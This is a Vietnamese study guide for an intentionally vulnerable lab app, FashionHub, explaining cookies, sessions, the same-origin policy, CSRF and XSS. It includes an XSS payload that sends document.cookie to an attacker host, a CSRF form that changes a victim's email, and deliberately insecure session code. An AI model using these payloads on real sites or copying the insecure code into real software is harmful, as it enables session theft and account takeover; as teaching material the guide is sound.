# HTTP, Cookie, Session, SOP, CSRF & XSS  

> File này là nền chung cho **F02 (Stored XSS)** và **F03 (CSRF)** — 2 vuln "hiểu nhầm nhiều nhất"
> của người mới. Cả hai đều xoay quanh **trình duyệt** và **origin**, không phải server.
>
> Nội dung gộp từ 3 file cũ: `http-cookies-sessions.md`, `same-origin-csrf-xss.md`,
> `auth-and-session-concept.md`. Đọc theo thứ tự các mục bên dưới.

---

## 1. HTTP là giao thức "không nhớ" (stateless)

Mỗi request HTTP **đứng một mình**: server không tự biết request thứ 2 có phải của cùng người với request thứ 1 không.

```
Browser:  "GET /products"           → Server: trả danh sách sản phẩm (không biết ai hỏi)
Browser:  "GET /profile"            → Server: ??? đây là ai?
```

Muốn server "nhớ" bạn (đăng nhập rồi), browser phải **tự chứng minh danh tính** trong mỗi request — đó là lúc cookie + session ra đời.

---

## 2. Cookie là gì

Cookie = **mảnh dữ liệu nhỏ do SERVER gửi xuống**, browser lưu lại, rồi gửi kèm tự động trong mọi request tiếp theo tới đúng domain + path.

```
Lần 1 — POST /api/login {email, password}
  Server verify đúng → response kèm header:
    Set-Cookie: session=3; HttpOnly; SameSite=Lax; Max-Age=3600

Lần 2+ — mọi request tới localhost:5173
  Browser tự thêm header (lập trình viên KHÔNG cần làm gì):
    Cookie: session=3
```

### 2.1 Các thuộc tính quan trọng của cookie

| Thuộc tính | Ý nghĩa | Nếu thiếu / set sai |
|---|---|---|
| `HttpOnly` | Cấm JavaScript (`document.cookie`) đọc cookie | XSS đọc được session → F02 chain |
| `Secure` | Chỉ gửi qua HTTPS | Cookie lộ trên đường truyền (lab chạy local HTTP nên bỏ qua) |
| `SameSite` | Kiểm soát gửi cookie khi request từ **trang khác** (cross-site): `Strict` / `Lax` / `None` | `None` → CSRF được (F03) |
| `Domain` / `Path` | Cookie hợp lệ cho domain/path nào | Set rộng quá → cookie gửi tới chỗ không nên |
| `Max-Age` / `Expires` | Thời gian sống | Quên set → cookie chết khi đóng browser (hoặc sống mãi nếu set dài) |

### 2.2 Bẫy lịch sử SameSite (quan trọng — hỏi phỏng vấn được)

```
Trước 2020:  cookie KHÔNG set SameSite  → mặc định cho gửi MỌI nơi (kể cả cross-site)
Từ ~2020:    Chrome/Firefox đổi mặc định → cookie KHÔNG set SameSite = SameSite=Lax

SameSite=Lax:  vẫn gửi cookie khi user BẤM link (navigation GET) tới trang đó,
               nhưng KHÔNG gửi khi request cross-site kiểu form POST / fetch / img
               → Lax đã chặn được phần lớn CSRF "tự động"
SameSite=None: gửi cookie kể cả request cross-site → CSRF cổ điển sống lại
               (bắt buộc kèm Secure, nếu không browser sẽ VỨT cookie)
```

→ Đây là lý do lab CỐ Ý set `SameSite=None` (D3): nếu "bỏ trống" thì browser mặc định Lax và demo CSRF (F03) sẽ chết âm thầm trên browser hiện đại.

---

## 3. Session là gì — và FashionHub làm kiểu gì

**Session** = trạng thái "đã đăng nhập" được server lưu. Có 2 trường phái:

```
Kiểu 1 — Session server-side (vd express-session):
  Server lưu session trong RAM/DB, cookie chỉ chứa 1 ID ngẫu nhiên (sessionId)
  → attacker có cookie cũng KHÔNG tự bịa được session khác

Kiểu 2 — Token tự chứa thông tin (vd JWT):
  Cookie/token chứa luôn thông tin user, có chữ ký của server
  → server chỉ cần verify chữ ký, không cần lưu gì
```

**FashionHub cố ý làm kiểu "tệ nhất của cả hai" (D4):**

```javascript
// session value = RAW USER ID, không ngẫu nhiên, không ký
res.cookie('session', String(user.id), { httpOnly: false, sameSite: 'none', secure: true })

// server đọc cookie rồi TIN TUYỆT ĐỐI:
const me = users.find(u => u.id === Number(req.cookies.session))
```

→ Hệ quả an toàn bị phá (đều là sub-findings của F04):

```
1. Tự đặt Cookie: session=1        → thành admin (không cần đăng nhập)   [broken auth]
2. XSS đọc document.cookie         → lấy được session của nạn nhân       [F02 chain]
3. Trang khác gửi form POST        → cookie tự gửi kèm → CSRF            [F03]
```

---

## 4. Xác thực và phiên — khái niệm

### 4.1 Xác thực

Xác thực là quá trình hệ thống kiểm tra danh tính của người truy cập.

Nhiệm vụ cơ bản nhất:
- người dùng là ai.
- người dùng có phải người được phép không.

Đây là bước đầu tiên, nhưng không phải bước cuối cùng của bảo mật.

### 4.2 Phiên

Phiên là cách hệ thống giữ trạng thái "đã xác thực" sau khi người dùng đăng nhập.

Ý tưởng chung:
- khi đã xác thực, người dùng có một thứ để chứng minh danh tính trong các request tiếp theo.
- hệ thống cần quản lý thứ đó sao cho không bị giả mạo, đánh cắp, hoặc lạm dụng.

Phiên yếu làm tăng rủi ro nhiều loại tấn công.

### 4.3 Cookie

Cookie thường dùng để lưu hoặc truyền thông tin phiên.

Cookie có thể chứa:
- session id.
- token.
- một giá trị khác để nhận diện trạng thái đăng nhập.

Cookie dễ bị ảnh hưởng nếu:
- không được bảo vệ đúng thuộc tính.
- được đọc hoặc gửi trong ngữ cảnh không an toàn.
- không được kiểm soát quyền truy cập.

Vì vậy, cách thiết lập cookie rất quan trọng.

### 4.4 Tại sao dễ bị tấn công

Nhiều cuộc tấn công không cần phá vỡ logic nghiệp vụ chính. Chúng chỉ cần lợi dụng:
- cách hệ thống lưu phiên.
- cách hệ thống truyền credential.
- cách trình duyệt xử lý request.
- cách hệ thống kiểm tra quyền.

Vì vậy, bảo mật không chỉ là "có đăng nhập", mà còn là "quản lý phiên và quyền truy cập đúng".

### 4.5 Những ý đáng nhớ

- xác thực khác với phân quyền.
- phiên yếu có thể dẫn đến giả mạo hoặc chiếm quyền.
- cookie là điểm phổ biến, cần cẩn thận attribute và cách dùng.
- attacker thường lợi dụng cơ chế xác thực, không chỉ tấn công code nghiệp vụ.

### 4.6 Tại sao cần hiểu

Nếu không hiểu xác thực và phiên, bạn khó giải thích:
- tại sao lỗ hổng này ảnh hưởng cả khi code nghiệp vụ có vẻ đúng.
- tại sao biện pháp bảo vệ không chỉ là "thêm form login".
- tại sao attacker có thể lợi dụng một số tấn công mà không cần mật khẩu thật.

Hiểu khái niệm là nền để hiểu các lỗ hổng cụ thể hơn.

---

## 5. Same-Origin Policy (SOP) — luật gốc của browser

### 5.1 Origin là gì

**Origin** = `scheme + host + port` của một trang web.

```
https://shop.com/page      → origin: https://shop.com (port 443 mặc định)
https://shop.com:3000/x    → origin: https://shop.com:3000  ← KHÁC origin trên (khác port)
http://localhost:5173      → origin: http://localhost:5173
http://localhost:3000      → origin: http://localhost:3000  ← KHÁC (khác port)
```

### 5.2 SOP là gì

SOP = browser cho **JavaScript của trang A** tự do **ĐỌC** dữ liệu của trang A, nhưng **CẤM đọc** dữ liệu của trang B (origin khác).

```
Trang evil.com có <script> fetch('https://bank.com/api/balance') </script>
  → Request có GỬI đi (nếu cookie hợp lệ) — nhưng browser CHẶN evil.com ĐỌC response
  → SOP chống "đọc trộm dữ liệu cross-site"
```

**Nhưng SOP KHÔNG chặn việc GỬI request cross-site.** Browser vẫn cho phép gửi kiểu:

```
<img src="https://bank.com/transfer?to=evil&amount=999">   ← GET tự động
<form method="POST" action="https://bank.com/transfer">    ← POST khi user mở trang
<script src="https://api.example.com/x">                    ← GET
```

Đây chính là kẽ hở mà **CSRF** chui qua: *gửi được thì thôi, không cần đọc*.

---

## 6. CSRF — giả mạo request "nhân danh" nạn nhân

**CSRF (Cross-Site Request Forgery)** = kẻ tấn công khiến **browser của nạn nhân** tự gửi một request **thay đổi trạng thái** tới trang nạn nhân đang đăng nhập — mà nạn nhân không hề hay biết.

### 6.1 Điều kiện để CSRF thành công (4 cái đủ)

```
1. Request là STATE CHANGE (đổi email, chuyển tiền, đổi password...) — không phải đọc dữ liệu
2. Trang đích xác thực bằng COOKIE (cookie tự gửi kèm — lập trình viên không kiểm soát được)
3. KHÔNG có CSRF token (không có gì chứng minh "request này do form của chính trang tạo")
4. Cookie được gửi trong request cross-site → tức cookie KHÔNG bị SameSite chặn (None/Lax-hở)
```

### 6.2 FashionHub (F03) — kịch bản đầy đủ

```
1. alice đăng nhập FashionHub → cookie session=3 (SameSite=None)
2. alice mở poc/csrf-poc.html  (trang của attacker — mở từ file:// hoặc domain khác)
3. Trang đó có form ẩn tự submit:
     <form method="POST" action="http://localhost:5173/api/profile/email">
       <input name="newEmail" value="alice@attacker.dev">
   Browser gửi kèm cookie session=3 (SameSite=None → KHÔNG chặn cross-site)
4. Server: cookie hợp lệ → đổi email alice → attacker dùng "quên mật khẩu" chiếm tài khoản
```

### 6.3 Vì sao CSRF "không cần đọc response"?

Vì mục tiêu là **hành động**, không phải dữ liệu. Attacker không cần biết kết quả — chỉ cần request được thực thi là đủ.

---

## 7. XSS — chạy JavaScript trong trang của nạn nhân

**XSS (Cross-Site Scripting)** = attacker nhét **JavaScript của mình** vào trang web, khiến nó chạy **trong origin của nạn nhân** — tức có toàn quyền như code của chính trang đó.

### 7.1 3 loại XSS

```
Reflected:  payload nằm trong URL/request, server in lại ra trang (vd ?q=<script>)
            → nạn nhân phải BẤM link độc thì mới dính
Stored:     payload LƯU trong database (vd review), ai mở trang đều dính   ← lab F02
            → nguy hiểm nhất: không cần lừa click, admin mở trang quản trị là dính
DOM-based:  payload chỉ xử lý ở JavaScript phía client, không qua server
```

### 7.2 FashionHub (F02) — vì sao Stored XSS ở reviews nguy hiểm

```
mallory (không cần đăng nhập — D8) POST review:
  content = <img src=x onerror="fetch('http://attacker/c?'+document.cookie)">
→ Lưu THÔ vào DB, admin panel render bằng dangerouslySetInnerHTML
→ Admin MỞ trang admin (chỉ cần xem review mới nhất) → JS chạy với quyền admin
→ Cookie admin (không HttpOnly) gửi về attacker server → replay = chiếm session admin
```

### 7.3 Điểm dễ nhầm: HttpOnly chống gì?

**HttpOnly chống XSS đánh cắp cookie, nhưng KHÔNG chống XSS.** XSS vẫn gọi API thay user được vì cookie (kể cả HttpOnly) vẫn được browser tự gửi kèm. HttpOnly chỉ là 1 lớp giảm thiểu, không phải fix XSS.

---

## 8. Quan hệ CSRF ↔ XSS (hỏi phỏng vấn hay gặp)

| Câu hỏi | Trả lời |
|---|---|
| CSRF có cần đọc response không? | Không — chỉ cần request state-change được thực thi |
| XSS có cần cookie không? | Không — chạy code trong origin là đủ quyền (cookie chỉ là 1 mục tiêu) |
| Cái nào nguy hiểm hơn? | XSS — attacker code chạy "hợp pháp" trong origin, làm được gần như mọi thứ user làm được. CSRF chỉ làm được các action mà request cross-site gửi được |
| CSRF token có chống XSS không? | Không — XSS đọc được token ngay trong trang (đó là lý do HttpOnly không áp được cho CSRF token) |
| SameSite chống cái nào? | CSRF (chặn cookie gửi cross-site). KHÔNG chống XSS (XSS chạy cùng-site nên cookie vẫn gửi bình thường) |
| Vì sao 2 cái này đi chung trong 1 lab? | Cùng gốc "browser tin origin như thế nào": CSRF = lợi dụng browser tự gửi cookie cross-site; XSS = phá vỡ ranh giới origin từ bên trong |

---

## 9. Phân biệt nhanh (hỏi nhau khi ôn)

| Câu hỏi | Trả lời |
|---|---|
| HTTP có nhớ bạn không? | Không — stateless. Cookie/session là cách "tự chứng minh" mỗi request |
| Cookie để ở đâu? | Browser, gửi kèm tự động theo domain/path |
| `HttpOnly` chống gì? | Chống JavaScript đọc cookie — nhưng KHÔNG chống XSS nói chung (XSS vẫn tự gọi API thay user được) |
| `SameSite=Lax` có chặn hết CSRF không? | Chặn request "tự động" cross-site (POST/fetch). Không chặn user bấm link độc (GET navigation) |
| FashionHub cookie tệ ở đâu? | (1) value = raw id không ký → giả mạo được; (2) không HttpOnly → XSS đọc được; (3) SameSite=None → CSRF được |
| Session khác JWT? | Session server-side: server lưu, cookie chỉ là ID. JWT: token tự mang thông tin + chữ ký, server stateless |

---

## 10. Ghi nhớ cho interview

> "Trong lab tôi tự dựng, session là cookie chứa raw user id không ký — cố ý để demo 3 lỗi
> cùng lúc: giả mạo session, XSS đánh cắp cookie, và CSRF nhờ SameSite=None. Khi viết cách
> sửa tôi chỉ ra: session id ngẫu nhiên + HttpOnly + SameSite=Lax/Strict + CSRF token."
